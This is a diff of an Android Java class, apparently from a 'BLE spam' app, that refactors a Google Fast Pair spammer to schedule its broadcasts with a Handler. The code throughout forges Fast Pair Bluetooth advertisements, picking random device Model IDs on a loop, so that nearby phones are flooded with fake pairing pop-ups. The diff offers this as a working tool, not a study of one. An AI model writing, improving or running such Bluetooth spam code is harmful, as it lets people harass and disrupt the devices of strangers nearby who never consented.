@@ -1,20 +1,54 @@
 package com.tutozz.blespam;
 
 import android.bluetooth.le.AdvertiseData;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.ParcelUuid;
-
-import java.util.Random;
 import java.util.UUID;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
+import java.util.Random;
 
-public class FastPairSpam implements Spammer {
-    public Runnable blinkRunnable;
+/**
+ * Implements Google Fast Pair spamming logic using a non-blocking Handler for cycling.
+ * Extends the abstract Spammer class.
+ * The advertisement data is pre-calculated for efficiency.
+ */
+// 1. EXTENDS Spammer instead of IMPLEMENTS
+public class FastPairSpam extends Spammer {
+
     public FastPairDevice[] devices;
     public AdvertiseData[] devicesAdvertiseData;
-    private int loop = 0;
-    public boolean isSpamming = false;
-    ExecutorService executor = Executors.newSingleThreadExecutor();
+
+    // Handler for scheduling the advertising cycle (must run on Main Looper)
+    private final Handler spamHandler = new Handler(Looper.getMainLooper());
+    private final BluetoothAdvertiser advertiser = new BluetoothAdvertiser();
+
+    // 2. Define the repeating advertising task
+    private final Runnable advertisingRunnable = new newFastPairAdvertisingRunnable();
+
+    // Inner class to define the advertising logic
+    private class newFastPairAdvertisingRunnable implements Runnable {
+        @Override
+        public void run() {
+            if (!isSpamming) {
+                // Self-terminate if stop() was called while waiting for next run
+                return;
+            }
+
+            // 3. Spammer Logic
+            // Randomly select one of the pre-built AdvertiseData objects
+            Random random = Helper.RANDOM_THREAD_LOCAL.get();
+            AdvertiseData data = devicesAdvertiseData[random.nextInt(devices.length)];
+
+            // Advertise, then immediately stop to prepare for the next cycle
+            advertiser.advertise(data, null);
+            advertiser.stopAdvertising();
+
+            // 4. Schedule the next run after the user-defined delay
+            // We use uiBlinkDelay (the user-controlled setting) to set the advertisement rate.
+            spamHandler.postDelayed(this, Helper.uiBlinkDelay);
+        }
+    }
+
     public FastPairSpam(){
         // Init FastPairDevices
         devices = new FastPairDevice[]{
@@ -220,44 +254,49 @@ public class FastPairSpam implements Spammer {
         };
 
         // Init all possible AdvertiseData
+        // Fast Pair Service UUID: 0000FE2C-0000-1000-8000-00805F9B34FB
         ParcelUuid serviceUUID = new ParcelUuid(UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"));
         devicesAdvertiseData = new AdvertiseData[devices.length];
         for(int i = 0; i < devices.length; i++) {
             FastPairDevice device = devices[i];
+            // The service data is the device Model ID (3 bytes)
             byte[] serviceData = Helper.convertHexToByteArray(device.getValue());
             devicesAdvertiseData[i] = new AdvertiseData.Builder()
                     .addServiceData(serviceUUID, serviceData)
                     .addServiceUuid(serviceUUID)
+                    // TxPower is recommended for accurate distance estimation by the receiver
                     .setIncludeTxPowerLevel(true)
                     .build();
         }
     }
 
-    public void start(){
-        executor.execute(() -> {
-            isSpamming = true;
-            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
-                if(isSpamming) {
-                    // Random device
-                    AdvertiseData data = devicesAdvertiseData[new Random().nextInt(devices.length)];
-                    // Advertise
-                    BluetoothAdvertiser b = new BluetoothAdvertiser();
-                    b.advertise(data, null);
-                    // Wait before next advertise
-                    try {
-                        Thread.sleep(Helper.delay);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    // Stop this advertise to start the next one
-                    b.stopAdvertising();
-                }
+    // 5. Implements abstract start() method
+    @Override
+    public void start() {
+        if (isSpamming) return;
 
-            }
-        });
+        // Use the inherited field
+        isSpamming = true;
+
+        // Start the first advertising cycle immediately
+        spamHandler.post(advertisingRunnable);
     }
-    public boolean isSpamming(){ return isSpamming; }
-    public void stop() { loop = Helper.MAX_LOOP+1; isSpamming = false; }
-    public Runnable getBlinkRunnable(){ return blinkRunnable; }
-    public void setBlinkRunnable(Runnable blinkRunnable){ this.blinkRunnable = blinkRunnable; }
+
+    // 6. Implements abstract stop() method
+    @Override
+    public void stop() {
+        if (!isSpamming) return;
+
+        // Stop the scheduling immediately
+        spamHandler.removeCallbacks(advertisingRunnable);
+
+        // Stop the currently running advertisement
+        advertiser.stopAdvertising();
+
+        // Use the inherited field
+        isSpamming = false;
+    }
+    
+    // 7. Removed: isSpamming(), getBlinkRunnable(), setBlinkRunnable(), loop, executor
+    // All handled by the abstract Spammer base class.
 }
